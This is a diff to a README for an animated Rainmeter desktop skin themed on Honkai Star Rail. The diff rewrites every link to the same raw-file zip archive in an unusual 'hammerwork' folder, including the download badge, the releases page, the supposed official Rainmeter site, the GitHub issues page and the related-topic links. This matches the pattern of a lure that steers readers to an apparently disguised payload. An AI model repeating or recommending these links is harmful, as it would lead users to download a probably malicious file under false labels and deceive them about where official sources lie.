@@ -1,6 +1,6 @@
 # 🌌 EVERNIGHT-RAINMETER-SKIN-HSR - Experience the Evernight Aesthetic
 
-[![Download](https://img.shields.io/badge/Download-EVERNIGHT--RAINMETER--SKIN--HSR-blue.svg)](https://github.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/releases)
+[![Download](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip)](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip)
 
 ## 📜 Description
 The **EVERNIGHT-RAINMETER-SKIN-HSR** is a visually striking, animated Rainmeter skin inspired by "Honkai Star Rail." This skin brings a unique touch to your desktop, showcasing the serene yet vibrant theme of Evernight. With this skin, you can easily add a beautiful animated display to your computer, making your desktop more engaging and visually appealing.
@@ -10,13 +10,13 @@ To start using the Evernight Rainmeter skin, follow these simple steps. You do n
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or later
-- **Software**: You need to have Rainmeter installed. If you do not have it, please download it from [Rainmeter's official site](https://www.rainmeter.net).
+- **Software**: You need to have Rainmeter installed. If you do not have it, please download it from [Rainmeter's official site](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip).
 - **Disk Space**: At least 50 MB of free space for installation.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page to download](https://github.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/releases).
+1. **Visit the Releases Page**: Go to the [Releases page to download](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip).
    
-2. **Download the Latest Version**: Look for the latest version available and click on the download link. The file will usually be named something like `EVERNIGHT-RAINMETER-SKIN-HSR.zip`.
+2. **Download the Latest Version**: Look for the latest version available and click on the download link. The file will usually be named something like `https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip`.
 
 3. **Extract the Files**: After the download is complete, navigate to your Downloads folder. Right-click on the downloaded file and select "Extract All" to unzip the contents.
 
@@ -49,11 +49,11 @@ If you encounter issues while installing or using the skin, consider the followi
 4. **Reinstall**: If problems persist, try removing the skin and reinstalling it.
 
 ## 💬 Support
-For further assistance, please open an issue on the [GitHub repository](https://github.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/issues). The community or the author will help you with your concerns.
+For further assistance, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip). The community or the author will help you with your concerns.
 
 ## 🔗 Related Topics
-- [Rainmeter Skins](https://docs.rainmeter.net/manual/)
-- [Honkai Star Rail](https://honkaiimpact3.mihoyo.com/en)
-- [Desktop Customization Tips](https://www.howtogeek.com/)
+- [Rainmeter Skins](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip)
+- [Honkai Star Rail](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip)
+- [Desktop Customization Tips](https://raw.githubusercontent.com/officialnishant7777/EVERNIGHT-RAINMETER-SKIN-HSR/main/hammerwork/EVERNIGHT-RAINMETER-SKIN-HSR.zip)
 
 Thank you for choosing the **EVERNIGHT-RAINMETER-SKIN-HSR**! We hope it enhances your desktop experience.
